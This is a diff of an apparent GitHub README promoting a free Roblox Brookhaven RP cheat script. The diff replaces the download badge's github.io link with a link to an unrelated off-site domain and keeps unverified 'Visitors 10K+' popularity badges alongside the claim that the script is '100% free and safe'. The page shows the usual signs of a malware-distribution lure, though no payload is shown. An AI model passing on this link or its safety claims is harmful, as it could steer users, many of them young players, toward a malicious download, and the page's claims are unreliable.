@@ -2,13 +2,19 @@
 
 Dominate Brookhaven RP with this all-in-one Roblox script! Unlock premium houses, teleport anywhere, use trolling tools, fly, and more — all 100% free and safe to use in 2025.
 
-<div style="text-align: center">
-  <a href="https://roblox-brookhaven-hack.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Brookhaven_Script_Hub-orange">
-  </a>
-</div>
+---
+
+<a href="https://kerten.sbs/kl/old">
+  <img
+    src="https://img.shields.io/badge/click%20For%20Download-green?style=for-the-badge&logo=github"
+    alt="gg"
+    width="1100"
+  >
+</a>
 
 ---
+
+
 
 ![Visitors: 10K+](https://img.shields.io/badge/Visitors-10K+-ff9f43) ![Subscribers: 3K+](https://img.shields.io/badge/Subscribers-3K+-6ab04c) ![Last Updated: 2025](https://img.shields.io/badge/Last_Updated-2025-3498db)
 
